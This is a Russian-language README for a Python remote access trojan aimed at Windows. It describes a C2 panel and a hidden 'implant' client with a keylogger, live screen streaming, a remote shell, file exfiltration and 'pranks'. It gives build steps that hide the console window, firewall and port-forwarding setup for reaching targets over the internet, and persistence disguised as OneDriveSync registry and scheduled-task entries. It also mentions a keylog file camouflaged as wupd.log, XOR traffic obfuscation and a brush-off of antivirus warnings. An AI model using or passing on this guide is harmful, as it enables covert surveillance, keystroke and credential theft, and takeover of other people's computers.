# rat — C2 + приколы

Python 3.9+ / Windows. Сервер — твоя консоль, клиент — имплант на цели.

## Файлы

```
gui_server.py / panel.exe — GUI-панель: живой стрим, все команды в окошке
server.py / server.exe   — консольная C2 (старый вариант, то же самое без интерфейса)
client.py / client.exe   — имплант, без окна, pillow вшит внутрь
pranks.py                — модуль приколов, импортируется клиентом
test_e2e.py              — самопроверка всей связки: python -u test_e2e.py
dist/                    — готовые exe
```

**panel.exe и client.exe должны быть одной версии** — стрим ходит по второму сокету, старый клиент его не умеет.

## Быстрый тест на своей машине

1. Запусти `dist\panel.exe` — окно панели, внизу статус «waiting for check-ins»
2. Запусти `dist\client.exe` — окно не появится, это нормально; цель сама появится в списке
3. Двойной клик по цели в списке — и все вкладки твои

## Подключение другой машины

По умолчанию клиент стучится на `127.0.0.1`.

1. В `client.py` поменяй `"SERVER": "ТВОЙ.IP.ЗДЕСЬ"`
2. Пересборка: `pyinstaller --onefile --noconsole --name client --clean client.py`
3. Сеть:
   - **LAN**: пропусти входящие TCP 6767 и 6768 (`netsh advfirewall firewall add rule name="c2" dir=in action=allow protocol=TCP localport=6767` и то же с 6768 / именем c2s)
   - **Интернет**: проброс обоих портов на роутере, либо Tailscale/WireGuard — тогда SERVER = IP внутри VPN

## Вкладки панели

### screen
- **start live view** — живой стрим; идёт по порту 6768, НЕ блокирует команды
- quality (10–90) и scale (0.2–1.0) крутятся рядом; fps видно у кнопки
- **one screenshot** — полный PNG в папку панели + превью
- **save frame** — текущий кадр стрима в JPG

### shell
- сессия помнит путь: `cd C:\Windows` → следующая команда выполнится там; текущий cwd всегда виден сверху
- чипы whoami / ipconfig / tasklist / systeminfo — одним кликом
- история стрелками ↑/↓, exit-код дописывается к выводу, clear чистит экран

### files
- путь + list; **up** — на уровень выше; кнопки дисков C:–H:
- **filter** — живой поиск по именам в текущей папке
- двойной клик по папке открывает её; папки сверху, файлы ниже
- **download selected** — качает частями по 1 МБ с прогрессом, до 512 МБ
- **upload to path...** — заливает выбранный файл в открытую папку, тоже частями с прогрессом

### processes
- список pid / имя / память; **kill selected** прибивает процесс (для системных нужен админ)

### pranks
- наведи на кнопку — под сеткой описание и что заполнять
- text — для msgbox / speak / notepad / type; url — для webpage
- STOP ALL — красная; PANIC слева — стоп прику всех целей разом

### keylog
- start / stop / dump & clear
- **live** — галка: новые нажатия подтягиваются сами каждые 2.5 сек
- в дампе метки времени и заголовок активного окна: `[14:32] Telegram — чат`
- save log — всё в txt; clear view — почистить окно

### sysinfo
- os, юзер, админ, cpu, ram (всего/свободно), uptime, ip, mac, разрешение, диски (всего/свободно на каждый), hwid, pid
- copy json — вся карта машины в буфер одним кликом

## Удаление с цели (после persist)

Через shell на цели:

```
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /f
schtasks /Delete /TN OneDriveSyncTask /F
taskkill /IM <имя_exe> /F
```

## Если что-то не так

- **Стрим молчит**: panel+client одной версии? порт 6768 открыт? старый server.exe закрыт?
- **Клиент не подключается**: IP в CFG, firewall, server/panel запущен; `Test-NetConnection ТВОЙ_IP -Port 6767` с цели
- **AV ругается на exe**: pyinstaller-файлы часто флагаются; свой файл — своё решение
- **cdtray тихий**: нет дисковода — no-op, не ошибка
- **Перед пересборкой client.exe**: `taskkill /IM client.exe /F` — иначе pyinstaller упадёт на заблокированном файле

## Заметки

- Трафик обфусцирован XOR'ом (ключ `6767`), это не шифрование
- Кадры до 8 МБ, вывод шелла до 1 МБ, передачи файлов до 512 МБ частями по 1 МБ
- Кейлог-файл на цели: `%TEMP%\wupd.log`, dump сливает и чистит
- `python -u test_e2e.py` — прогонит всю связку и скажет, что живо
